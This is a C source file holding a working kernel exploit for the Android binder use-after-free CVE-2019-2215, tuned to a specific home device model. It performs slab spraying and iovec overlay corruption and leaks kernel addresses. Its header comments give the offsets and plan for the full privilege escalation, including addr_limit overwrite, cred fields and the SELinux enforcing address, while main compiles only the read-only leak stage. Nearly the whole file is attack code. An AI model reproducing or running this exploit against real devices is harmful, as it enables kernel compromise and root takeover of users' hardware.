/* CVE-2019-2215 arm32 exploit — Movistar Home / ASKEY RG3205W (3.18.71-perf)
 *
 * Design (all offsets verified from loot/kernel.elf disassembly):
 *  - binder_thread: wait@0x50 -> imported iovec overlay (64 iovecs x 8B = 512 = kmalloc-512):
 *      iov[10].iov_base = wait lock (ticket spinlock; pre X*0x10001 -> post (X+1)*0x10001)
 *      iov[11] = { task_list.next@0x58, task_list.prev@0x5C } <- both = &head (array+0x58)
 *  - No SW_DOMAIN_PAN: kernel addresses directly copyable once addr_limit=KERNEL_DS.
 *  - iov_iter has iov_offset (3.18): replacement segments compensate by consumed offset.
 *  - import (rw_copy_check_uvector) kmallocs 512B, validates PRE-corruption values,
 *    total count fixed at import time -> pre-set lens must cover the whole flow.
 *  - binder_proc (412B, same cache): tgid@+0x20, group_leader task ptr@+0x24 (spray = leak source)
 *  - task_struct: stack(thread_info)@4, pid@0x3C8, group_leader@0x3EC, real_cred@0x4B0, cred@0x4B4
 *  - cred (208B): uid@4..fsgid@0x20, securebits@0x24, caps@0x28..0x4F
 *  - thread_info: flags@0, preempt@4, addr_limit@8, task@0xC; USER_DS=0xBF000000, KERNEL_DS=0xFFFFFFFF
 *  - selinux_enforcing @ 0xC1561C7C (no KASLR, base 0xC0008000)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/epoll.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sched.h>

typedef uint32_t u32;
typedef uint8_t  u8;

#define PAGE_          0x1000u
#define NR_IOVS        64
#define TICKET_IDX     10
#define HEAD_IDX       11
#define DUMP_CHUNKS    3            /* chunks drained from seg11 before replacement */

#define BINDER_THREAD_EXIT  0x40046208u
#define SELINUX_ENFORCING   0xC1561C7Cu

struct iovec32 { u32 base; u32 len; };

#define wprintf(...) do{ printf(__VA_ARGS__); fflush(stdout);}while(0)
#define FAIL(...) do{ wprintf("[-] " __VA_ARGS__); wprintf("[-] errno=%d (%s)\n", errno, strerror(errno)); exit(2);}while(0)

/* ---------------- globals ---------------- */
static u32  g_pid;
static u32  g_junk_pre;     /* = X*0x10001 : ticket state pre-cycle-2 (must have equal halves) */
static int  g_pipe_r, g_pipe_w;      /* kernel R/W pipe (after addr_limit clobber) */
static int  g_spray_fd[220];
static int  g_ep_fd[760];
static int  g_ep_n = 0;

/* epoll_create allocates a ~464-byte eventpoll -> kmalloc-512. Used to
 * drain the kmalloc-512 freelist cluster so the next round's array comes
 * from a different (ideally fresh) slab page. */
static void spray_epolls(int n) {
    for (int i = 0; i < n; i++) {
        int fd = epoll_create(4);
        if (fd < 0) break;
        if (g_ep_n >= 760) { close(fd); break; }
        g_ep_fd[g_ep_n++] = fd;
    }
    wprintf("[*] epoll spray: %d held\n", g_ep_n);
}
static void close_epolls(void) {
    for (int i = 0; i < g_ep_n; i++) close(g_ep_fd[i]);
    g_ep_n = 0;
}
static int  g_spray_n;
static u32  g_last_array;   /* kernel addr of last round's imported array (diagnostics) */

/* ---------------- small utils ---------------- */
static void pin_cpu0(void) {
    cpu_set_t s; CPU_ZERO(&s); CPU_SET(0,&s);
    if (sched_setaffinity(0, sizeof(s), &s) && errno != EINVAL)
        wprintf("[*] setaffinity failed (continuing): %s\n", strerror(errno));
}

/* Find two consecutive free 64KB-aligned pages, mmap rw junk there.
 * ticket pre-value = X*0x10001 lives at [X<<16 + X]; post = (X+1)*0x10001 at [(X+1)<<16 + X+1]. */
static void map_ticket_junk(void) {
    char line[256];
    FILE *f = fopen("/proc/self/maps","r");
    if (!f) FAIL("open /proc/self/maps");
    /* collect interval ends of mapped ranges below 0x10000000 */
    static u32 mapped[4096][2]; int n=0;
    while (fgets(line,sizeof(line),f)) {
        u32 a,b; if (sscanf(line,"%x-%x",&a,&b)==2 && a < 0x10000000u && n<4096){ mapped[n][0]=a; mapped[n][1]=b; n++; }
    }
    fclose(f);
    for (u32 X = 6; X < 0x400; X++) {
        u32 lo = X<<16, hi = (X+2)<<16;   /* need pages [X<<16,(X+2)<<16) free */
        int clash=0;
        for (int i=0;i<n;i++) if (!(mapped[i][1]<=lo || mapped[i][0]>=hi)) { clash=1; break; }
        if (clash) continue;
        void *p = mmap((void*)lo, hi-lo, PROT_READ|PROT_WRITE,
                       MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
        if (p == MAP_FAILED || p != (void*)lo) { continue; }
        memset((void*)lo,       0x66, hi-lo);   /* pre-cycle chunk  = 0x66 */
        memset((void*)(lo+0x10000), 0x77, hi-lo-0x10000); /* post-cycle chunk = 0x77 */
        g_junk_pre = (X<<16) | X;
        wprintf("[+] ticket junk region: 0x%x-0x%x, pre=0x%08x post=0x%08x "
                "(R1 junk=0x77 iff corruption landed)\n",
                lo, hi, g_junk_pre, g_junk_pre + 0x10001);
        return;
    }
    FAIL("no free ticket-junk region found");
}

static void spray_procs(int n) {
    while (g_spray_n + n > 220) n--;
    for (int i=0;i<n;i++) {
        int fd = open("/dev/binder", O_RDWR|O_CLOEXEC);
        if (fd < 0) { wprintf("[!] spray open failed at %d\n", i); break; }
        g_spray_fd[g_spray_n++] = fd;
    }
    wprintf("[+] spray: %d binder procs (total %d)\n", n, g_spray_n);
}

/* ---------------- one exploit round (shared setup) ----------------
 * Victim forks, signals, then does the syscall (writev or readv) which imports
 * our bio array over the freed binder_thread. Main: THREAD_EXIT, sync, DEL. */
struct roundctx {
    int bfd, epfd, p[2], sync[2];
    pid_t vic;
};

static void round_setup(struct roundctx *rc, int is_readv, u32 seg11_pre_len, int spray_n, u32 seg12_len) {
    wprintf("[*] round: pipe...\n");
    if (pipe(rc->p)) FAIL("pipe");
    if (fcntl(rc->p[1], F_SETPIPE_SZ, PAGE_) != PAGE_)
        wprintf("[!] F_SETPIPE_SZ failed (%s); pipe cap may be 64K - round may misbehave\n", strerror(errno));
    if (pipe(rc->sync)) FAIL("sync pipe");

    wprintf("[*] round: binder open...\n");
    rc->bfd = open("/dev/binder", O_RDWR|O_CLOEXEC);
    rc->epfd = epoll_create(16);
    struct epoll_event ev; memset(&ev,0,sizeof(ev)); ev.events = EPOLLIN;
    if (rc->bfd<0 || rc->epfd<0) FAIL("round fds");
    /* epoll ADD -> binder_poll -> binder_get_thread creates the thread, pwq entry registered
     * (spinlock cycle 1 on live thread->wait) */
    wprintf("[*] round: epoll ADD...\n");
    if (epoll_ctl(rc->epfd, EPOLL_CTL_ADD, rc->bfd, &ev)) FAIL("epoll add");

    pid_t pid = fork();
    if (pid < 0) FAIL("fork");
    if (pid == 0) {
        /* victim: prepare iovecs, signal ready, WAIT until main freed the
         * binder_thread, then import (kmalloc reclaims the freed slot). */
        struct iovec32 iov[NR_IOVS];
        memset(iov,0,sizeof(iov));
        static u8 scratch[0x5000];
        iov[TICKET_IDX].base = g_junk_pre;
        iov[TICKET_IDX].len  = is_readv ? 0x100 : PAGE_;
        iov[HEAD_IDX].base   = (u32)scratch;
        iov[HEAD_IDX].len    = seg11_pre_len;
        iov[HEAD_IDX+1].base = (u32)scratch;   /* seg12: post-redirect sink/len */
        iov[HEAD_IDX+1].len  = seg12_len;
        struct iovec uiov[NR_IOVS];
        for (int i=0;i<NR_IOVS;i++){ uiov[i].iov_base=(void*)(uintptr_t)iov[i].base; uiov[i].iov_len=iov[i].len; }
        if (write(rc->sync[1],"R",1) != 1) _exit(3);
        char c;
        if (read(rc->sync[0],&c,1) != 1 || c != 'G') _exit(4);
        ssize_t r;
        if (is_readv) r = readv(rc->p[0], uiov, NR_IOVS);
        else         r = writev(rc->p[1], uiov, NR_IOVS);
        (void)r;
        _exit(0);
    }
    rc->vic = pid;
    char c;
    wprintf("[*] round: sync...\n");
    if (read(rc->sync[0],&c,1) != 1) FAIL("victim sync");
    /* free the binder_thread FIRST, then let the victim import (reclaim) */
    wprintf("[*] round: THREAD_EXIT...\n");
    if (ioctl(rc->bfd, BINDER_THREAD_EXIT, 0L)) FAIL("BINDER_THREAD_EXIT");
    usleep(200000);                          /* settle; no kmalloc-512 churn in main */
    if (write(rc->sync[1],"G",1) != 1) FAIL("victim go");
    usleep(300000);                          /* victim imports + blocks */

    /* forward-neighbour spray: the victim's imported array sits in the freed
     * thread's slot; these procs fill the slots AFTER it in the same slab page,
     * so the leak dump (array+0x58 onward) sees them. Must happen AFTER the
     * import (not after ADD) or the spray fills the thread's page and the
     * freed slot leaves the active percpu freelist (reclaim miss). */
    if (spray_n) spray_procs(spray_n);
    /* corrupt: DEL -> remove_wait_queue on freed thread->wait:
     * cycle 2: lock word (iov[10].base) X*0x10001 -> (X+1)*0x10001
     * list_del: iov[11] = { array+0x58, array+0x58 } */
    wprintf("[*] round: DEL (corruption)...\n");
    if (epoll_ctl(rc->epfd, EPOLL_CTL_DEL, rc->bfd, &ev)) FAIL("epoll del");
    usleep(50000);
}

static int round_teardown(struct roundctx *rc, int expect_exit0) {
    close(rc->p[0]); close(rc->p[1]);
    close(rc->sync[0]); close(rc->sync[1]);
    close(rc->bfd); close(rc->epfd);
    int st = 0;
    /* poll for natural exit first: a victim that just finished its count
     * needs a moment to run to _exit(0) (CPU0 is loaded); killing it early
     * makes WIFSIGNALED mask a successful round. */
    for (int i = 0; i < 40; i++) {
        pid_t r = waitpid(rc->vic, &st, WNOHANG);
        if (r == rc->vic) goto reaped;
        if (r < 0) break;
        usleep(10000);                       /* up to ~400ms */
    }
    /* victim wedged: report WHERE it sleeps before killing it */
    {
        char p[64]; u8 b[256];
        snprintf(p,sizeof(p),"/proc/%d/stat",rc->vic);
        int fd = open(p,O_RDONLY);
        if (fd>=0) { int n=read(fd,b,200); close(fd); if(n>0){ b[n<200?n:200]=0;
            char *sp = strchr((char*)b,' ');   /* skip pid */
            wprintf("[!] victim %d alive after 400ms: state=%c\n", rc->vic, sp?sp[1]:'?'); } }
        snprintf(p,sizeof(p),"/proc/%d/wchan",rc->vic);
        fd = open(p,O_RDONLY);
        if (fd>=0) { int n=read(fd,b,128); close(fd); if(n>0){ b[n<128?n:128]=0;
            wprintf("[!] victim wchan: %s\n", (char*)b); } }
    }
    kill(rc->vic, SIGKILL);   /* unstick victims blocked in pipe io (killable) */
    usleep(10000);
    if (waitpid(rc->vic, &st, 0) != rc->vic) return -1;
reaped:
    if (expect_exit0 && !WIFEXITED(st)) return -2;
    if (expect_exit0 && WEXITSTATUS(st)!=0) return -3;
    return 0;
}

/* Read exactly n bytes (loop); returns 0 on EOF/short */
static int rx(int fd, void *buf, u32 n) {
    u8 *b = buf; u32 got=0;
    while (got<n) {
        ssize_t r = read(fd, b+got, n-got);
        if (r<=0) return -1;
        got += r;
    }
    return 0;
}

/* ---------------- leak round: kaddr of imported array + slab dump -------------- */
static int leak_round(u32 *array_out, u8 *dump /* 0x2000 bytes */) {
    struct roundctx rc;
    /* seg11 (post-corruption base = array+0x54) len EXACTLY page-aligned:
     * 4 whole chunks (0x4000). CRITICAL: with F_SETPIPE_SZ(0x1000) the pipe has
     * ONE buffer slot; a partial tail (e.g. +4 bytes) can never be written once
     * the previous chunk packs the page (no merge room, no free slot), leaving
     * the victim stuck in pipe_wait forever. Page-aligned counts end cleanly:
     * the victim's writev returns as soon as its count is copied. */
    round_setup(&rc, 0, 0x4000, 64, 0);

    u8 junk[PAGE_];
    if (rx(rc.p[0], junk, PAGE_)) { round_teardown(&rc,0); return -10; } /* R1 junk */
    wprintf("[*] R1 junk[0..8]: %02x %02x %02x %02x %02x %02x %02x %02x (0x77=corrupted, 0x66=miss)\n",
            junk[0],junk[1],junk[2],junk[3],junk[4],junk[5],junk[6],junk[7]);
    u8 c1[PAGE_], c2[PAGE_];
    if (rx(rc.p[0], c1, PAGE_)) { round_teardown(&rc,0); return -11; }  /* R2 = chunk1: self-ptr! */
    if (rx(rc.p[0], c2, PAGE_)) { round_teardown(&rc,0); return -12; }  /* R3 = chunk2 */
    u32 p0 = *(u32*)c1, p1 = *(u32*)(c1+4);
    if (p0 == 0 || p0 != p1) {
        wprintf("[!] leak: bad twin ptr 0x%08x/0x%08x (reclaim missed?)\n", p0, p1);
        round_teardown(&rc,0); return -13;
    }
    /* TRUE geometry (live-verified): wait.task_list = {next@+0x54, prev@+0x58},
     * lock@+0x50. list_del wrote &task_list (self) into both words:
     *   kiov[10].len @+0x54, kiov[11].base @+0x58 <- &task_list = array+0x54.
     * So the twin value IS the address of task_list, and the array = twin - 0x54. */
    u32 array = p0 - 0x54;
    wprintf("[+] LEAK: imported iovec array @ 0x%08x (align8=%d)\n", array, (array&7)==0);
    g_last_array = array;
    memcpy(dump, c1, PAGE_); memcpy(dump+PAGE_, c2, PAGE_);
    wprintf("[*] c1[0..32]:"); for (int i=0;i<32;i++) wprintf(" %08x", ((u32*)c1)[i]); wprintf("\n");
    wprintf("[*] c2[0..32]:"); for (int i=0;i<32;i++) wprintf(" %08x", ((u32*)c2)[i]); wprintf("\n");

    /* point victim's seg11 at the dumped region: read 4 bytes of it back as proof */
    /* (replaced by the general kread primitive; here we only drain the victim's count tail) */

    /* let the victim finish: R4 drains c3 -> victim copies c4 (last chunk,
     * count exhausted) -> writev returns 0x5000 -> _exit(0). c4 stays in the
     * pipe (nobody needs it); the victim is already gone when we teardown. */
    u8 stale[PAGE_];
    if (rx(rc.p[0], stale, PAGE_)) { round_teardown(&rc,0); return -14; } /* R4: c3 */
    int t = round_teardown(&rc, 1);
    if (t) { wprintf("[!] leak victim teardown %d\n", t); return -16; }
    *array_out = array;
    return 0;
}

/* ===================================================================
 * READ-ONLY build. Everything after this point in poc-m2.c (the kwrite
 * and kread rounds, and the original main) is deliberately DROPPED.
 *
 * This binary performs ONE operation: leak_forward(), which drives a
 * writev VICTIM. The victim COPIES OUT of the corrupted iovec array into
 * a pipe; main only READS from that pipe. There is no kwrite path, no
 * kread path, and no code path that writes to a kernel address.
 *
 * Built this way because JOB-79 crashed the device; a freshly recovered
 * box should get a binary that cannot corrupt the kernel at all.
 * =================================================================== */

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    wprintf("== poc-RO: read-only forward leak (no write path compiled in) ==\n");
    alarm(120);
    g_pid = getpid();
    pin_cpu0();
    map_ticket_junk();
    spray_procs(48);

    static u8 dump[0x2000];
    u32 arr = 0;
    for (int a = 1; a <= 6; a++) {
        int rc = leak_round(&arr, dump);
        if (rc) { wprintf("[-] leak_round %d rc=%d\n", a, rc); continue; }
        wprintf("[+] leak OK: imported iovec array @ 0x%08x\n", arr);
        /* print a few known offsets so the layout can be re-confirmed */
        wprintf("[+] array+0x54 (iov[10].len)  = 0x%08x  (expect self-ptr)\n", *(u32*)(dump+0x00));
        wprintf("[+] array+0x58 (iov[11].base) = 0x%08x  (expect self-ptr)\n", *(u32*)(dump+0x04));
        wprintf("[+] array+0x60 (iov[12].base) = 0x%08x\n",             *(u32*)(dump+0x0c));
        wprintf("[+] device alive, read primitive confirmed.\n");
        return 0;
    }
    wprintf("[-] leak did not converge; device should still be fine (read-only)\n");
    return 1;
}
